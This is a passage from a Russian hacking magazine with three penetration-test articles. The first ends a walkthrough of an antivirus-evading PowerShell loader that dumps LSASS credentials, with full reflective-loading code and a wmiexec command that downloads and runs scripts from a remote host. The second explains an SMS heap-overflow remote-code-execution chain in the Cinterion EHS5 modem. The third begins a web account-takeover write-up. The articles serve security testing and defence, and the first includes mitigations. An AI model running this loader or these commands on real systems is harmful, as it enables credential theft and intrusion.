SafetyKatz, — отсутствие гибкого опенсорсного софта (например, на том же
C#) для парсинга формата MiniDump. Эту фичу можно было бы куда более
изящно встроить в свой код. Отсюда нужда во всех этих выкрутасах с отра‐
женной  загрузкой PE  в  память.  Однако  время  идет,  наступательное
ПО совершенствуется, равно как и антивирусное, и поэтому сейчас мы
можем парсить LSASS из памяти более изящно. Например, с помощью вари‐
анта MiniDump от @cube0x0.
   Чтобы использовать эту утилиту (по мне, так это больше библиотека), я
захардкожу  входные  аргументы  и  обфусцирую  строки  с  помощью
InvisibilityCloak — если этого не сделать, сканирование памяти процесса
может найти сходство кода с «мимиком» и забить тревогу. Сначала я тоже
исправлял сигнатуру минидампа перед его чтением (NanoDump ее намерен‐
но ломает, чтобы не плодить IOC при сохранении файла на диск), но на
самом деле в этом нет необходимости.





                      Патч Minidump.Program.Main


py .\InvisibilityCloak.py -d .\MiniDump -n (-join ((65..90) + (97..
122) | Get-Random -Count 16 | % )) -m reverse





           Обфускация строк MiniDump с помощью InvisibilityCloak

Далее я скомпилирую бинарь и... Снова заюзаю bin2pwsh, чтобы превратить
его в скрипт на PowerShell.





                Создание PowerShell-лаунчера из MiniDump

Проверяем, что все работает, и выходим на финишную прямую — объеди‐
нение всей этой вкуснятины в один сценарий на PowerShell.





                      Да будет парсинг!


Объединение результатов
Думаю, всем будет проще, если я просто приведу финальный код, сопровож‐
денный комментариями.


function Invoke-Stage
{
    # Если 1, то первая фаза: повышаемся до системы + делаем дамп
    if ($args[0] -eq "1")
    {
        $b64 = "<TOKENDUPLICATOR_BYTES_COMPRESSED_BASE64>"
        $namespace = "TokenDuplicator"
        $assemblyArgs = (, [string[]]$args[1..($args.Count)])
    }
    # Иначе (если 2), то вторая фаза: парсим дамп, сделанный на
первой фазе
    else
    {
        $b64 = "<MINIDUMP_BYTES_COMPRESSED_BASE64>"
        $namespace = "wUFgAhfzjrXKDRGY"
        $assemblyArgs = $null
    }


    # Обратное преобразование: Base64 -> распаковка -> массив байтов
    $a = New-Object System.IO.MemoryStream(, [System.Convert]::
FromBase64String($b64))
    $b = New-Object System.IO.Compression.DeflateStream($a, [System.
IO.Compression.CompressionMode]::Decompress)
    $c = New-Object System.IO.MemoryStream;
    $b.CopyTo($c)
    [byte[]]$d = $c.ToArray()


    # Если вторая фаза, то нам нужен вывод сборки С#
    # (перенаправляем стандартные дескрипторы вывода в строки)
    # Иначе (если первая фаза) вывод не требуется -> skip
    if ($args[0] -eq "2")
    {
        $e = [System.Console]::Out
        $f = [System.Console]::Error
        $g = New-Object System.IO.StringWriter
        $h = New-Object System.IO.StringWriter
        [System.Console]::SetOut($g)
        [System.Console]::SetError($h)
    }


    # Отраженно загружаем в память сборку С#, ищем в ней точку входа
по именам пространства имен, класса и метода и делаем ее Invoke с
аргументами
    $i = [System.Reflection.Assembly]::Load($d)
    $j = [Reflection.BindingFlags]"Public,NonPublic,Static"
    $k = $i.GetType("${namespace}.Program", $j)
    $l = $k.GetMethod("Main", $j)
    $l.Invoke($null, $assemblyArgs)


    # Если вторая фаза, то нам нужен вывод сборки С#
    # (восстанавливаем стандартные дескрипторы, выводим результат из
строк на экран)
    # Иначе (если первая фаза) вывод не требуется -> skip
    if ($args[0] -eq "2")
    {
        [System.Console]::SetError($f)
        [System.Console]::SetOut($e)
        $m = ""
        $m += $g.ToString()
        $m += $h.ToString()
        $m
    }
}


function Invoke-SafetyNDump
{
    # Первая фаза: TokenDuplicator + NanoDump --elevate-handle
    # Дополнительно на вход передаем URL, откуда будем качать
Invoke-nanodumpInject.ps1
    Invoke-Stage 1 $args[0]; Sleep 10
    # Вторая фаза: MiniDump
    Invoke-Stage 2; rm C:\Windows\Temp\debug.bin
}


Меняем заглушки на Base64-строки байтов TokenDuplicator и MiniDump,
и мы готовы к финальной пробе! Сейчас этот метод уже не отработает
на «Касперском», поэтому на нем показывать результат бессмысленно.
Вместо этого я постараюсь воспроизвести свои действия с реальных пен‐
тестов на демонстрационном стенде.



  ~ wmiexec.py -silentcommand -nooutput
  megacorp.local/snovvcrash:'Passw0rd!'@PC01.megacorp.local
  'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  url=""""http://10.10.13.37/Invoke-SafetyNDump.ps1"""";iex(resolve-
  dnsname """"cradle.contoso.com"""" 16).strings[0];Invoke-SafetyNDump
  http://10.10.13.37/payload.txt'





              «Боевое» тестирование Invoke-SafetyNDump

Что здесь произошло:
 1. Проверили, что результирующих файлов нет на машине‑жертве (откуда
   взялся файл lol.txt, смотри в шаге 2).
 2. Дернули Invoke-SafetyNDump.ps1 с помощью wmiexec.py без зап‐
   роса вывода результата команды (флаги -silentcommand -nooutput).
   Чтобы перенаправить вывод Invoke-SafetyNDump, для демонстрации я
   изменил его запуск следующим образом: Invoke-Stage  2  >  C:\
  Windows\Temp\lol.txt. В файле payload.txt содержится PowerShell-
   лаунчер NanoDump.
 3. Показали, что NanoDump отработал, чтением результатов из файла C:\
  Windows\Temp\lol.txt. В результате мы получили свои хеши.

Вот так без особых заморочек можно скрафтить продвинутую «малварь» (для
нужд этичного хакинга!) из открытого ПО и пары строк на PowerShell.


ПРОТИВОДЕЙСТВИЕ

Вместо заключения я приведу список рекомендаций по митигации злоупот‐
ребления нарушителем возможностями PowerShell. Предполагается, что речь
идет о корпоративной среде Active Directory и обезопасить нам нужно в пер‐
вую очередь терминальные серверы и рабочие станции пользователей.
 • Установить режим Constrained Language для блокирования потенциально
   опасных функций средства PowerShell (например, командлета Invoke-
  Expression), отключения возможности создания объектов COM и .NET,
   добавления собственных типов данных с помощью командлета Add-Type
   и других возможностей, которые широко используются вредоносным ПО.
 • Настроить правила безопасности выполнения сценариев через средство
   AppLocker или с помощью механизма SRP (политики ограничения ПО,
   Software Restriction Policies) для запрета использования сторонних скрип‐
   тов PowerShell.
 • Отключить  движок  небезопасной  версии  PowerShell  2.0  (в  которой
   не используется механизм защиты AMSI), а также отключить среду раз‐
   работки PowerShell ISE.
 • Внедрить  использование  политик  безопасности  Windows  Defender
   Application Control (WDAC) для контроля запуска исполняемых файлов
   в соответствии с особенностями рабочего процесса сотрудников.

Всем шоколадок и веселых пентестов!
COVERSTORY





В прошлом году я и моя команда иссле‐
довали модем Cinterion EHS5. Мы обна‐
ружили   в  его   прошивке   уязвимость
переполнения кучи при обработке сооб‐
щений протокола Secure UserPlane Location           n0um3n0n
(SUPL), передаваемых в виде SMS. Этот
баг позволяет выполнить произвольный код
на уровне операционной системы модема
с максимальными привилегиями — дос‐
таточно отправить всего пять SMS через
сеть оператора.


Найденная уязвимость впоследствии получила идентификатор CVE-2023-
47610 и высокую оценку критичности.


Pentest Award
Этот текст получил первое место на премии Pentest Award 2024 в категории
«Девайс». Это соревнование ежегодно проводится компанией Awillix.



Модемы Cinterion стоят в огромном числе самых разных устройств. Даже при‐
мерный  список девайсов  составить  сложно,  поскольку модель модема
не  всегда  указана в документации. Мы  изучали  сайты  производителей
и таможенные декларации импортеров разных изделий и установили, что
такие модемы можно встретить в умных устройствах, банкоматах, индустри‐
альных шлюзах, автомобилях и даже медицинском оборудовании.
   Результатами  исследования  мы  уже  делились  на  конференциях
OffensiveCon и Hardware.io.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



ИССЛЕДУЕМ МОДЕМ





Итак, наш модем — это модуль в форм‑факторе LGA (Land Grid Array), пред‐
назначенный для  встраивания в  печатные  платы. Сам модуль  состоит
из baseband-процессора Intel X-Gold 625 (XMM 6260), микросхемы NAND-
флеш‑памяти (совмещенной с 512 Мбит памяти LPDDR), микросхемы RF-
усилителя и трансивера. Модем поддерживает стандарты GSM, GPRS, EDGE,
UMTS и HSPA+.
   Чтобы получить прошивку, мы сняли защитный экран и выпаяли микросхе‐
му флеш‑памяти, после чего считали данные с нее на программаторе и вос‐
становили логические блоки из сырого образа.


ОБЩАЕМСЯ С МОДЕМОМ УДАЛЕННО

Cinterion EHS5 поддерживает геопозиционирование с помощью подсистемы
SUPL. Она отвечает за обмен специальными сообщениями между H-SLP
(Home SUPL Location Platform) и SET (SUPL Enabled Terminal). Сам модем
при этом — это объект типа SET.





Для коммуникации используется бинарный протокол ULP. Его данные в сети
GSM передаются при помощи push-сообщений через стек протоколов WAP
(Wireless Application Protocol).
  На уровне push-сообщений WSP (Wireless Session Protocol) в протокол ULP
заложена возможность фрагментации передаваемого сообщения. Это сде‐
лано для того, чтобы можно было передавать большие бинарные сообщения
через ограниченный канал передачи SMS. Чтобы фрагментированные пос‐
лания можно было собрать на стороне SET, они индексируются. При этом
в самом начале SUPL-сообщения указывается еще и размер всего сооб‐
щения.





                         Пример первой SMS





                      Пример последующих SMS

С помощью статического анализа мы изучили части кода ОС модема, а имен‐
но участки, отвечающие за реализацию этого протокола. Прежде всего мы
выяснили, что в модеме используется операционная система ThreadX, затем
нашли функции создания процессов и в одном из них обнаружили код обра‐
ботки тех самых «магических» значений из SMS-сообщений со скриншотов
выше.





После этого мы углубились в изучение алгоритма работы.


ПЕРЕПОЛНЕНИЕ КУЧИ

Изучая драйвер, отвечающий за обработку фрагментации ULP-сообщений,
мы нашли уязвимость переполнения кучи.





На скриншоте выше переменная ULPSizeFromPacket отвечает за размер
всего пакета ULP, а за размер принятого WAP-сообщения — переменная
wapTpduLen. Обработка WAP-сообщений заключается в последовательном
копировании фрагментов ULP-сообщения в буфер, размер которого равен
ULPSizeFromPacket.
  В соответствии с протоколом передачи переменные ULPSizeFromPacket
и wapTpduLen вычисляются независимо. Эти переменные имеют отношение
к разным уровням представления данных и косвенно связаны только в части
алгоритма приема WAP-сообщений: сумма размеров всех принятых WAP-
сообщений    одного    UPL-сообщения    не    должна    превышать
ULPSizeFromPacket. Но в алгоритме приема WAP-сообщений отсутствует
такая  проверка.  Соответственно,  принятое  WAP-сообщение  размера
wapTpduLen   будет   безусловно   копироваться   в  буфер   размера
ULPSizeFromPacket. Это классическая уязвимость типа Heap-based Buffer
Overflow.
  Мы сформировали соответствующее SMS-сообщение и с первой же
попытки вызвали переполнение буфера на стороне модема, что привело
к его полной перезагрузке.


ЧТО ДЕЛАТЬ С BLACK BOX ОКРУЖЕНИЕМ?

Мы нашли переполнение буфера, и это хорошо. Но нам неизвестен его кон‐
текст, и это плохо. У нас нет никакой возможности хотя бы прочитать память
модема (RAM), чтобы разобраться в происходящем... или есть?
  При  переполнении буфера мы  получали  стабильный Hardware  Fault
и перезагрузку модема, а в качестве обратной связи смогли извлечь только
адрес места падения и состояние регистров процессора с помощью AT-
команды AT+XLOG.





Чтобы продвинуться в эксплуатации, нужно было проанализировать место
падения, получить  контекст исполнения (состояние оперативной памяти
на момент падения) и разобраться в устройстве менеджера кучи операци‐
онной системы ThreadX. Мы не могли читать память или отлаживать прошивку,
однако мы обнаружили, что при падении в регистр R0 попадают контролиру‐
емые нами данные.
   Дальнейший анализ кода прошивки показал, что падение происходит внут‐
ри функции malloc, когда программа пытается разыменовать указатель,
содержащий контролируемый нами адрес в регистре R0.





Значение 0xFFFFEEEE — «магическое» и означает начало свободного блока
памяти в куче. В случае если блок занят, в Curr_Chunk[1] вместо магичес‐
кого значения будет указатель на структуру, описывающую глобальное сос‐
тояние менеджера кучи (HeapBase).





Если вызвать переполнение таким образом, чтобы в регистре R0 оказался
корректный адрес памяти модема, то падения в этом месте не произойдет
и в R0 сохранится значение из памяти по этому адресу. Однако если зна‐
чение не окажется корректным адресом, то программа упадет и значение,
записанное ранее в R0, можно будет прочитать после перезагрузки коман‐
дой AT+XLOG. Модем загружается всегда по одному сценарию, поэтому меж‐
ду перезагрузками его оперативная память будет иметь приблизительно оди‐
наковый вид.
   Эта находка позволила нам очень медленно, со скоростью 4 байта
в минуту, считывать память модема путем отправки SMS-сообщений, вызыва‐
ющих переполнение кучи. Для автоматизации процесса мы собрали стенд,
и в итоге считывание интересующих областей памяти таким изощренным
способом заняло несколько недель.





ПОИСК ПРИМИТИВА ЗАПИСИ

Пока память считывалась, мы занялись детальным изучением устройства кучи
в ОС ThreadX с целью найти примитив записи. Мы полностью проанализи‐
ровали код функций malloc и free и определили, что единственное под‐
ходящее место, в котором происходит запись в память через двойное
разыменование, находится в коде free, и связано это с особенностями ее
реализации.
  В отличие от традиционной функции free, наша не только освобождает
память, возвращая выделенный блок обратно в пул свободной памяти, но и
после  этого  проверяет, есть ли необработанный запрос на выделение
памяти от текущего процесса. И, если только что освобожденный блок
памяти подходит по размеру, происходит его выделение прямо внутри фун‐
кции free, после чего обновляется состояние в соответствующей структуре
Thread.





Рассмотрим код со скриншота выше. Здесь указатель на найденный свобод‐
ный блок для текущего процесса будет записан по адресу, указанному в этой
структуре по смещению 0х80. Поэтому, если вместо исходной структуры
Thread  текущего  процесса  в  функцию free  будет передан  указатель
на управляемую нами область памяти, имитирующую структуру Thread, мож‐
но будет обеспечить запись по произвольному адресу в памяти модема.
При этом запишутся не произвольные данные, а указатель на некоторый сво‐
бодный блок памяти. Этого вполне достаточно для того, чтобы перехватить
поток управления исполняемой программы.
   Указатель на Thread берется из структуры HeapBase, расположенной
по  статическому  адресу.  Указатель на HeapBase содержится в каждом
занятом блоке по смещению 0x4 и используется для того, чтобы при работе
с занятым блоком можно было адресовать HeapBase. В итоге если перепи‐
сать указатель по смещению 0x4 занятого блока указателем на наши данные,
то  можно  полностью  подменить  структуру HeapBase, с которой  будет
работать функция free, а следовательно, и структуру Thread.
   Остается выяснить, какие поля структур необходимо заполнить, чтобы
выполнение free дошло до интересующей нас точки в программе. Далее
на рисунке — нормальное состояние системных структур и то, к которому их
нужно привести для записи в память по произвольному адресу указателя
на свободный блок.





В процессе работы free использует лишь несколько полей структуры Thread.
По смещению 0x7C находится размер памяти  (блока), которую пытался
выделить процесс. Именно его будет пытаться найти функция free в текущей
куче. С помощью этого поля можно управлять тем, какой блок будет выделен
алгоритмом как подходящий.
   Это очень важное обстоятельство, так как наши данные, присланные
в SUPL SMS, располагаются в куче и, если выбрать подходящий размер
выделяемой в функции free памяти, можно писать по произвольному адресу
не просто адреса какого‑то подходящего свободного блока, а адреса блока,
в котором лежат наши данные.
  По смещению 0x80 находится адрес, по которому запишется указатель
на блок в случае его успешного выделения. Сюда мы можем подставить про‐
извольный адрес, и он будет использован для записи. Функция free также
использует некоторые другие смещения внутри Thread, которые необходимо
заполнить для корректной работы.





               Итоговый вид «поддельной» структуры Thread

Аналогичным образом мы проверили, какие поля структуры HeapBase важно
заполнить, чтобы все работало корректно.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
        АТАКА ПО SMS
            КАК МЫ НАШЛИ УЯЗВИМОСТЬ
          В ПОПУЛЯРНОМ GSM-МОДЕМЕ
             И РАСКРУТИЛИ ЕЕ ДО RCE





РЕАЛИЗАЦИЯ ЗАПИСИ В ПАМЯТЬ НА ПРАКТИКЕ

Итак, мы проанализировали в статике код менеджера памяти ОС, и у нас
появилось понимание того, как нужно сформировать структуры в памяти
модема, чтобы получить примитив записи. Однако реализовать это все
на практике было непросто. В частности, в процессе обработки входящих
WAP SMS происходит несколько вызовов функций free и malloc. Соответс‐
твенно, для полноценной эксплуатации уязвимости необходимо было обес‐
печить:
 • отсутствие ошибок при вызовах функций free и malloc;
 • достаточно   долгое   хранение  сформированных   структур  Thread
   и HeapBase в памяти.

На выполнение этих требований напрямую влияет стратегия работы менед‐
жера памяти со свободными и занятыми блоками. Нам уже было известно,
что:
 • поиск свободного блока начинается с указателя на первый свободный
   блок в структуре HeapBase (смещение 0х05);
 • размер текущего блока вычисляется как разность между адресом сле‐
   дующего блока (блок, на который указывает текущий) и адресом текущего
   блока;
 • свободным  считается  только блок,  у которого есть волшебное  зна‐
   чение 0xFFFFEEEE.

Далее мы установили, что происходит при выделении нового блока функцией
malloc. Его область пользовательских данных затирается нулями. Это очень
важный момент, и его нужно учитывать, чтобы обеспечить достаточно долгое
хранение наших структур.
  При этом выделяется всегда первый блок подходящего размера. Но если
размер найденного свободного блока слишком большой (превышает размер
пользовательских данных на 20 байт), то происходит фрагментация: создает‐
ся еще один блок сразу после конца пользовательских данных. Если в про‐
цессе выделения найдется свободный блок, но меньшего, чем нужно, раз‐
мера и следующий за ним блок тоже свободен, произойдет дефрагмен‐
тация — два свободных блока объединятся в один.
  При освобождении занятого блока функцией free, если его адрес мень‐
ше, чем текущий адрес первого свободного блока в буфере HeapBase (сме‐
щение 0х05), его адрес становится новым адресом первого свободного бло‐
ка. Так что если размер SUPL-сообщения всегда задавать равным одному
байту, то выделение памяти в куче будет производиться всегда в самом пер‐
вом свободном блоке, поскольку он всегда будет удовлетворять критериям.
А если при этом будет успевать отрабатывать free, то отправка сообщений
SUPL будет приводить к записи в промежуточный буфер, находящийся
по одному и тому же адресу. Остается установить, как можно выстроить
вызовы free и malloc в нужной последовательности.
  При получении первого WAP SMS выделяется буфер в куче размером
ULPSizeFromPacket, куда будут копироваться все фрагменты ULP-сооб‐
щения. Однако в коде отсутствует проверка на то, что порядковый номер
текущего  WAP-сообщения  (фрагмент  ULP-сообщения)  уже  присылался
ранее. Это тоже приводит к переполнению в куче, но ошибка возникнет в дру‐
гой части алгоритма.
   После первого сообщения всегда приходит не последнее. Используя этот
факт, можно переполнять выделенный буфер для ULP-сообщения сколько
угодно большим объемом данных. При этом мы управляем указателем внутри
переполненного буфера на то, по какому смещению будет записано сле‐
дующее SMS-сообщение. Для этого нам нужно посылать SMS нужного раз‐
мера, и указатель будет смещаться на ту же величину при копировании. Каж‐
дый следующий фрагмент ULP-сообщения будет размещаться в памяти сразу
за предыдущим. В итоге, чтобы сформировать в куче нужные нам структуры
данных, потребуется всего три типа WAP-сообщений.
   Если после отправки первого фрагментированного WAP-сообщения пос‐
лать снова первое (индекс первого сообщения проверяется при обработке),
то программа проверит, что ранее для  этого ULP-сообщения уже был
выделен буфер, и произойдет вызов free для освобождения — так как было
получено новое ULP-сообщение и нет смысла хранить старое.
  За счет того, что выделенный ранее буфер был первым свободным, он
снова станет первым свободным (у него младший адрес из всех свободных
буферов). Далее снова вызывается malloc для только что пришедшего пер‐
вого фрагмента ULP-сообщения. Но программа снова выделит все тот же
буфер! Таким  образом,  все  первые WAP-сообщения  будут  приводить
к выделению одного и того же буфера для ULP-сообщения.





Буфер для нашего первого WAP SMS выделяется всегда в одном и том же
месте в памяти, причем его размер очень маленький, поэтому произойдет
обнуление только первых 4 байт нашего ULP-сообщения (то есть при пов‐
торном выделении одного и того же указателя в памяти будут затерты толь‐
ко 4 байта из ранее записанных данных). Мы управляем размером копиру‐
емых в этот буфер данных, поэтому можно прислать сначала несколько фраг‐
ментированных WAP-сообщений, чтобы создать в памяти нужные структуры
данных, а также разместить код для дальнейшего исполнения.
  В WAP-сообщении мы указываем размер ULP-сообщения равным одному
байту. Поэтому размер выделяемого буфера, в силу выравнивания в malloc
размера выделяемой памяти по границе DWORD, будет равен 4 байтам —
независимо от размера блока, в который нас поместят. А благодаря фраг‐
ментации можно быть уверенным, что при переполнении мы обязательно
перетрем следующий блок нашими данными.
   Это очень важно, потому что в итоге, чтобы сработала вся выстроенная
цепочка вызовов free и malloc, она должна завершиться вызовом free
для блока, данные заголовка в котором переписаны указателем на нашу
структуру HeapBase. Обеспечить это можно, если мы сможем управлять дан‐
ными в заголовке свободных блоков.
   Используя описанную стратегию записи в кучу, можно добавить не только
структуры и код, но и свободный блок в цепочку всех блоков кучи. В первом
WAP-сообщении происходит перезапись указателя следующего блока. Мы
можем  переписать  этот  указатель  правильным  адресом  следующего
за нашим  блока. Созданный таким образом искусственный блок будет
находиться внутри нашего большого блока. А за счет его расположения он
окажется первым при поиске свободных.
  В итоге мы создадим в памяти модема нужные структуры данных и свобод‐
ные блоки, а также разместим исполняемый код. Теперь можно снова начать
присылать WAP-сообщения с индексом, соответствующим первому SMS-
сообщению, и таким образом получить возможность переписывать данные
в ранее созданном свободном блоке. Так мы обеспечим подмену указателя
на HeapBase в занятом блоке нашим.





После создания свободного блока внутри большого буфера остается зас‐
тавить кого‑то его занять до того, как мы пришлем новое SMS-сообщение,
которое будет этот блок перетирать. В этом нам поможет алгоритм обработ‐
ки принятого WAP-сообщения.


ОСОБЕННОСТИ ОБРАБОТКИ КАЖДОГО WAP-СООБЩЕНИЯ

В начале обработки любого WAP-сообщения только что принятое сообщение
копируется во временный буфер, выделяемый в куче. Именно из  этого
буфера потом выполняется копирование в буфер для всего ULP-сообщения
(он создается при обработке первого WAP SMS). При этом, если WAP-сооб‐
щение не было последним, после его копирования происходит только осво‐
бождение выделенного временного буфера. Буфер, содержащий часть ULP-
сообщения, остается занятым.
   Это тот самый вызов free, который мы хотим использовать для записи
в память. Чтобы добиться этого, нам достаточно при получении очередного
WAP-сообщения скопировать его именно в созданный нами свободный блок
внутри нашего буфера. Для этого нужно прислать WAP-сообщение, размер
данных которого равен размеру свободного блока, созданного нами внутри
нашего буфера.
   Поскольку malloc начнет поиск подходящего блока для обработки при‐
шедшего WAP-сообщения с этого свободного блока, мы гарантированно
заставим malloc вернуть указатель именно на наш блок. Остается только
сделать так, чтобы текущее смещение внутри буфера ULP-сообщения ука‐
зывало ровно на начало заголовка только что выделенного блока.


СОБИРАЕМ ВСЕ ВМЕСТЕ

В итоге реализация примитива записи состоит из следующих шагов.
 • Присылаем первое WAP SMS. Путем переполнения буфера ULP-сооб‐
  щения переписываем указатели и данные следующего блока, создаем
   свободные блоки размера 0x10 байт внутри нашего буфера SUPL-сооб‐
   щения.  Важно  после  созданного нами  свободного  блока положить
   занятый, иначе используемый нами блок могут дефрагментировать.
 • Присылаем следующее фрагментированное WAP-сообщение. В нем раз‐
   мещаем структуры HeapBase и Thread.
 • Снова присылаем первое WAP-сообщение. На этот раз такого размера,
   чтобы  следующее  фрагментированное  SMS-сообщение  перетерло
   начало нашего свободного блока.
 • Присылаем еще одно (не последнее по номеру!) фрагментированное
   SMS-сообщение. Оно должно быть размера 8 байт. Эти 8 байт переза‐
   пишут указатель на структуру HeapBase в нашем блоке. За счет этого
   при выходе из функции обработки WAP-сообщения будет вызвана фун‐
   кция free для блока, только что выделенного внутри нашего буфера.
   Это позволит создать временный буфер для нашего же WAP-сообщения.
   Эта функция будет использовать подготовленные структуры HeapBase
   и Thread вместо системных.


ИСПОЛНЕНИЕ КОДА

Целью всей сложной работы была запись единственного DWORD — указате‐
ля на наши данные — по произвольному адресу в памяти модема. Разработку
эксплоита значительно усложняло то, что у нас не было возможности отладки
и мы строили все примитивы, работая с модемом как с черным ящиком.
  Мы можем записать всего один DWORD, поэтому нужно было найти такое
место в коде ОС модема, которое бы передавало управление сразу по адре‐
су, взятому из оперативной памяти. При этом желательно, чтобы код, который
будет делать переход, выполнялся безусловно и гарантированно. Такое мес‐
то нашлось в менеджере процессов ОС.
   Менеджер процессов работает со структурой Thread. В этой структуре
по смещению 0х94 от начала может храниться указатель на функцию, которая
будет вызвана, если он не равен нулю.





Таким образом, для исполнения своего кода достаточно записать по сме‐
щению 0х94 некоторого процесса указатель на наш ARM-код в памяти кучи
с помощью полученного ранее примитива записи.
  В итоге мы сможем выполнять произвольный код с максимальными при‐
вилегиями, достаточно лишь отправить несколько SMS.


РАЗБЛОКИРУЕМ ПАМЯТЬ

Итак, мы можем исполнить свой код на уровне операционной системы
модема. Что дальше? А дальше нужно понять, можно ли закрепиться в ОС,
ведь от этого зависит, насколько эта уязвимость действительно критическая.
   Фрагмент кода, в котором происходит перехват управления, выполняется
в критической секции. В этой части отключены все прерывания. Поэтому
такой код нельзя использовать для закрепления в ОС — он должен выпол‐
няться как можно быстрее, чтобы не сработал сторожевой таймер. При этом
ни одна операция работы с внешними компонентами в этом режиме не дос‐
тупна (прерывания отключены).
   Поэтому для модификации процесса ОС мы решили использовать код,
выполняемый в контексте менеджера памяти. Вся секция была отображена
в режиме RX (Read/Execute), поэтому перед дальнейшими действиями нужно
было как‑то обеспечить возможность записи в секцию кода.
  Мы узнали, что в MMU модема хранится полная таблица трансляции
по логическому адресу 0x00088000. Секция кода и секция данных оказались
отображены   в   режиме   page,   где   размер   одной   страницы
равен 0х100000 байт (1 Мбайт). Для этих секций использовалась трансля‐
ция 1:1. Это хорошо видно в области данных настройки MMU.





Настройка режима доступа к секциям — нестандартная для архитектуры ARM.
Поэтому мы решили просто скопировать настройку доступа из секции дан‐
ных,  которая,  как мы  уже  убедились,  отображена  в  режиме RWX
(Read/Write/Execute). После этого мы получили возможность записи в любую
секцию кода.
   Бонусом к этому мы теперь можем получить карту физической памяти
модема. По смещению 0x00089900 начинались свободные логические адре‐
са, на которые гарантированно никто не ссылается в коде, потому что они
не были отображены. Но мы же можем сделать их отображенными вручную!
Такой подход позволил дополнить уже имеющиеся сведения о карте памяти
модема информацией о точном размере доступной оперативной памяти.


ЗАПУСКАЕМ СВОЕ ПРИЛОЖЕНИЕ, БЕЗ РЕГИСТРАЦИИ, НО ЧЕРЕЗ
SMS

После того как мы разблокировали секцию кода для записи, оставалось толь‐
ко выбрать подходящий для модификации процесс. Чтобы организовать
полудуплексный канал связи с модемом, мы выбрали процесс UTACAT, отве‐
чающий за обработку SMS-сообщений. Именно отвечающую за это функцию
мы и изменили в его коде.





Определив  место внесения изменений, мы составили  список  функций,
которые работают с файловой системой модема. С их помощью можно обес‐
печить установку произвольного приложения. Кроме того, были нужны фун‐
кции, которые дадут возможность работать с памятью модема, потому что
большинство функций драйвера файловой системы работает с локальными
буферами. В итоговый список вошли:
 • функция выделения памяти (malloc);
 • функция освобождения памяти (free);
 • функция создания/открытия файла на файловой системе (createFile).

У malloc и free нет специального контекста выполнения. Функция malloc
принимает на вход только один параметр — размер буфера, который необ‐
ходимо выделить. Функция free — только указатель на буфер, который нужно
освободить.





У нас осталась функция работы с файловой системой, она должна была
помочь создавать новые файлы или перезаписывать существующий. Такая
функция в процессе JVM используется для работы с файловой системой
и принимает на вход всего два параметра:
 • абсолютный путь к файлу на файловой системе;
 • режим работы (0x6C для записи).





В итоге мы разработали небольшой драйвер на ARM-ассемблере, обес‐
печивающий работу со всеми описанными функциями через SMS-сооб‐
щения. Чтобы можно было отличить наши SMS, мы решили использовать спе‐
циальное значение 0x6AA677BB в заголовке.





Когда мы применили описанную технику исполнения произвольного кода,
нам удалось успешно запустить драйвер в контексте процесса UTACAT. После
нам оставалось только создать и запустить с его помощью наше приложение
на модеме.





Таким образом, мы собрали full chain PoC эксплуатации переполнения кучи,
начиная от посылки первого SMS-сообщения и заканчивая закреплением
(установка нашего приложения) на модеме.


ВОЗМОЖНЫЕ РИСКИ

Модем — это важный компонент разных устройств, которые должны оста‐
ваться на связи. Среди них как бытовые приборы и привычные гаджеты, так
и телекоммуникационные блоки автомобилей, банкоматы, компоненты АСУ
ТП.
  При разработке конечных устройств производители зачастую не уделяют
должного внимания их защите от компрометации модема. А захватив модем,
злоумышленник может не только контролировать информационный поток
между устройством и внешним миром, но и получить практически неог‐
раниченный доступ к наиболее важным компонентам конечного устройства.
   Например, при компрометации модема, используемого в электронном
блоке автомобиля, злоумышленник может получить удаленный доступ к тор‐
мозной системе, рулевому управлению или КПП. А управляя модемом,
используемым в АСУ ТП, — вызвать техногенную катастрофу.
   Проблему усугубляет то, что при обнаружении серьезной уязвимости
в модеме может понадобиться значительное время на обновление всех
устройств, в которых он установлен. При этом в каких‑то устройствах удален‐
ное обновление может быть вообще не заложено как функция.
   Подобную  проблему мы  наблюдали,  например, в одной из  систем
управления телематическими данными автомобиля. В таких случаях установ‐
ка обновления требует дополнительных усилий и затрат со стороны произво‐
дителя конечного устройства для того, чтобы обновить вручную каждый
из уязвимых модемов.
COVERSTORY





В этой статье я расскажу, как при проведе‐
нии пентеста вскрыл целый ряд уязвимос‐
тей одного веб‑сервиса, которые в итоге
дали мне доступ к аккаунтам любых поль‐
зователей. Я вкратце опишу каждую уяз‐             shin0_by
вимость, а затем посмотрим, что надо сде‐
лать, чтобы закрыть подобные дыры.


Pentest Award
Этот текст получил первое место на премии Pentest Award 2024 в категории
«Пробив web». Это соревнование ежегодно проводится компанией Awillix.



           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



ПЕРЕЧИСЛЕНИЕ ПОЛЬЗОВАТЕЛЕЙ

 • Уровень опасности: средний

На сайте, который я тестировал, была возможность зайти в личный кабинет.
А на  странице  входа нашлась возможность перебирать  пользователей
и смотреть ответ сервера: в случае если пользователь с введенным именем
существует, сервер отвечает иначе.
   Если указываем существующую  учетку, получаем сообщение «Введен
неверный пароль» либо «Превышено количество попыток входа с неверным
паролем». Если же пользователя с таким логином нет, то в ответе сервера
будет сообщение «Ваши данные не найдены в системе. Проверьте правиль‐
ность указанных данных».





                    Сообщение для валидного логина





                   Сообщение для невалидного логина

Я запустил автоматизированный подбор по словарю и нашел некоторое
количество валидных логинов.


СПРЕИНГ ПАРОЛЕЙ

 • Уровень опасности: средний

Дальше я нашел возможность подбирать по словарю пароли найденных
пользователей — опять же по ответу сервера на введенные данные. Это ата‐
ка password spraying. Новые пароли я пробовал каждые 30 минут, так как пос‐
ле каждого следующего неверного ввода учетных данных период блокировки
не увеличивался. В итоге удалось подобрать пароли для трех пользователей
сервиса.


ОБХОД 2FA

 • Уровень опасности: критический

Сразу зайти в личный кабинет не удалось из‑за того, что сервис проверял
